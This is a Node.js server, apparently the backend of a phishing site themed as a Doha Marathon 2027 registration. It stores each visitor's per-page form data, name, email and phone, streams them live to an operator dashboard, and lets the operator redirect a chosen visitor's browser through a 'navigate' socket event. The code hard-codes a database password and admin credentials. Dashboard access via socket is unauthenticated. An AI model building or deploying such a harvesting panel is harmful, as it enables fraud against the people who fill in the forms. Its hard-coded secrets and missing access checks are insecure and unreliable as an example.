const express = require("express");
const http = require("http");
const path = require("path");
const crypto = require("crypto");
const { Server } = require("socket.io");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

const ADMIN_USER = process.env.ADMIN_USER || "Hadmin";
const ADMIN_PASS = process.env.ADMIN_PASS || "Hadmin12345@@";
const PROJECT_NAME = process.env.PROJECT_NAME || "ماراثون الدوحة 2027";

const DATABASE_URL = process.env.DATABASE_URL || "postgresql://postgres:.8gq-%2BgVt%21UUN%40%3F@db.difwpmsmqxvbtsslrdov.supabase.co:5432/postgres";

const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"], credentials: true }
});

app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: "10mb" }));

// --- In-memory cache (for real-time socket tracking) ---
const liveSockets = new Map();
const authTokens = new Set();

function generateToken() {
  return crypto.randomBytes(48).toString("hex");
}

function authMiddleware(req, res, next) {
  const token = req.headers["authorization"]?.replace("Bearer ", "") || req.headers["x-auth-token"] || "";
  if (!token || !authTokens.has(token)) {
    return res.status(401).json({ error: "غير مصرح" });
  }
  next();
}

// --- Initialize database tables ---
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        name TEXT,
        email TEXT,
        phone TEXT,
        current_page TEXT DEFAULT 'index',
        is_connected BOOLEAN DEFAULT false,
        form_data JSONB DEFAULT '{}',
        last_seen BIGINT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      )
    `);
    console.log("Database tables ready");
  } catch (err) {
    console.error("DB init error:", err.message);
  }
}

// --- DB helpers ---
async function upsertSession(sessionId, data) {
  try {
    await pool.query(`
      INSERT INTO sessions (session_id, name, email, phone, current_page, is_connected, form_data, last_seen)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      ON CONFLICT (session_id) DO UPDATE SET
        name = COALESCE(NULLIF($2, ''), sessions.name),
        email = COALESCE(NULLIF($3, ''), sessions.email),
        phone = COALESCE(NULLIF($4, ''), sessions.phone),
        current_page = COALESCE($5, sessions.current_page),
        is_connected = $6,
        form_data = sessions.form_data || $7,
        last_seen = $8
    `, [
      sessionId,
      data.name || "",
      data.email || "",
      data.phone || "",
      data.currentPage || "index",
      data.isConnected || false,
      JSON.stringify(data.formData || {}),
      Date.now()
    ]);
  } catch (err) {
    console.error("DB upsert error:", err.message);
  }
}

async function getSession(sessionId) {
  try {
    const res = await pool.query("SELECT * FROM sessions WHERE session_id = $1", [sessionId]);
    if (res.rows.length === 0) return null;
    const r = res.rows[0];
    return {
      sessionId: r.session_id,
      name: r.name,
      email: r.email,
      phone: r.phone,
      currentPage: r.current_page,
      isConnected: r.is_connected,
      formData: r.form_data || {},
      lastSeen: parseInt(r.last_seen)
    };
  } catch (err) {
    console.error("DB get error:", err.message);
    return null;
  }
}

async function getAllSessions() {
  try {
    const res = await pool.query("SELECT * FROM sessions ORDER BY last_seen DESC");
    return res.rows.map(r => ({
      sessionId: r.session_id,
      name: r.name,
      email: r.email,
      phone: r.phone,
      currentPage: r.current_page,
      isConnected: r.is_connected,
      formData: r.form_data || {},
      lastSeen: parseInt(r.last_seen)
    }));
  } catch (err) {
    console.error("DB getAll error:", err.message);
    return [];
  }
}

async function getStats() {
  try {
    const res = await pool.query(`
      SELECT
        COUNT(*) FILTER (WHERE is_connected = true) AS connected,
        COUNT(*) AS total
      FROM sessions
    `);
    const r = res.rows[0];
    return { connectedUsers: parseInt(r.connected), totalRegistrations: parseInt(r.total) };
  } catch (err) {
    console.error("DB stats error:", err.message);
    return { connectedUsers: 0, totalRegistrations: 0 };
  }
}

async function setConnected(sessionId, connected) {
  try {
    await pool.query("UPDATE sessions SET is_connected = $1, last_seen = $2 WHERE session_id = $3", [connected, Date.now(), sessionId]);
  } catch (err) {
    console.error("DB setConnected error:", err.message);
  }
}

// --- Auth endpoints ---
app.post("/dashboard/login", (req, res) => {
  const { username, password } = req.body || {};
  if (username === ADMIN_USER && password === ADMIN_PASS) {
    const token = generateToken();
    authTokens.add(token);
    return res.json({ success: true, token });
  }
  res.status(401).json({ error: "اسم المستخدم أو كلمة المرور غير صحيحة" });
});

app.post("/dashboard/logout", (req, res) => {
  const token = req.headers["authorization"]?.replace("Bearer ", "") || req.headers["x-auth-token"] || "";
  authTokens.delete(token);
  res.json({ success: true });
});

// --- API endpoints ---
app.get("/api/config", (req, res) => {
  res.json({ projectName: PROJECT_NAME });
});

app.get("/api/stats", authMiddleware, async (req, res) => {
  const stats = await getStats();
  res.json({ ...stats, activeUsers: stats.connectedUsers });
});

app.get("/api/users", authMiddleware, async (req, res) => {
  const list = await getAllSessions();
  res.json(list);
});

app.get("/api/user/:sessionId", authMiddleware, async (req, res) => {
  const data = await getSession(req.params.sessionId);
  if (!data) return res.status(404).json({ error: "مستخدم غير موجود" });
  res.json(data);
});

app.post("/api/track", async (req, res) => {
  const { sessionId, type, page, data } = req.body || {};
  if (!sessionId) return res.status(400).json({ error: "missing sessionId" });

  let session = await getSession(sessionId) || { isConnected: false, currentPage: "index", formData: {} };

  if (type === "form-submit" && data) {
    if (!session.formData) session.formData = {};
    session.formData[page || "unknown"] = data;
    if (data.firstName) session.name = [data.firstName, data.lastName].filter(Boolean).join(" ");
    if (data.email) session.email = data.email;
    if (data.phone) session.phone = data.phone;
  }

  if (page) session.currentPage = page;

  await upsertSession(sessionId, session);
  io.to("dashboard").emit("user:update", { sessionId, ...session });
  res.json({ ok: true });
});

// --- Socket.io ---
io.on("connection", (socket) => {
  const { sessionId, instanceKey, token } = socket.handshake.query || {};

  if (token || instanceKey) {
    socket.join("dashboard");
  }

  if (sessionId) {
    liveSockets.set(sessionId, socket.id);

    (async () => {
      let session = await getSession(sessionId);
      if (!session) {
        session = { isConnected: true, currentPage: "index", formData: {} };
      }
      session.isConnected = true;
      await upsertSession(sessionId, session);
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    })();

    socket.on("user:join", async ({ page }) => {
      let session = await getSession(sessionId) || { formData: {} };
      session.currentPage = page || "index";
      session.isConnected = true;
      await upsertSession(sessionId, session);
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });

    socket.on("user:form-submit", async ({ page, formData }) => {
      let session = await getSession(sessionId) || { formData: {} };
      if (!session.formData) session.formData = {};
      if (page && formData) {
        session.formData[page] = formData;
        if (formData.firstName) session.name = [formData.firstName, formData.lastName].filter(Boolean).join(" ");
        if (formData.email) session.email = formData.email;
        if (formData.phone) session.phone = formData.phone;
      }
      session.isConnected = true;
      await upsertSession(sessionId, session);
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });

    socket.on("user:page-change", async ({ page }) => {
      let session = await getSession(sessionId) || { formData: {} };
      session.currentPage = page || session.currentPage;
      session.isConnected = true;
      await upsertSession(sessionId, session);
      io.to("dashboard").emit("user:update", { sessionId, ...session });
    });

    socket.on("disconnect", async () => {
      liveSockets.delete(sessionId);
      await setConnected(sessionId, false);
      const session = await getSession(sessionId);
      if (session) {
        io.to("dashboard").emit("user:update", { sessionId, ...session });
      }
    });
  }

  socket.on("navigate", async ({ sessionId: targetId, page }) => {
    const targetSocketId = liveSockets.get(targetId);
    if (targetSocketId) {
      io.to(targetSocketId).emit("navigate", { page });
      let session = await getSession(targetId);
      if (session) {
        session.currentPage = page;
        await upsertSession(targetId, session);
        io.to("dashboard").emit("user:update", { sessionId: targetId, ...session });
      }
    }
  });
});

// --- Broadcast live stats every 3 seconds ---
setInterval(async () => {
  const stats = await getStats();
  io.to("dashboard").emit("stats:live", {
    connectedUsers: stats.connectedUsers,
    totalRegistrations: stats.totalRegistrations,
    activeUsers: stats.connectedUsers
  });
}, 3000);

// --- Static files ---
app.use(express.static(path.join(__dirname), {
  extensions: ["html"],
  setHeaders: (res, filePath) => {
    if (filePath.endsWith(".html")) {
      res.setHeader("Content-Type", "text/html; charset=utf-8");
    }
  }
}));

app.get("*", (req, res) => {
  res.status(404).send("Not Found");
});

// --- Start server ---
initDB().then(() => {
  server.listen(PORT, () => {
    console.log("Server running on port " + PORT);
  });
});
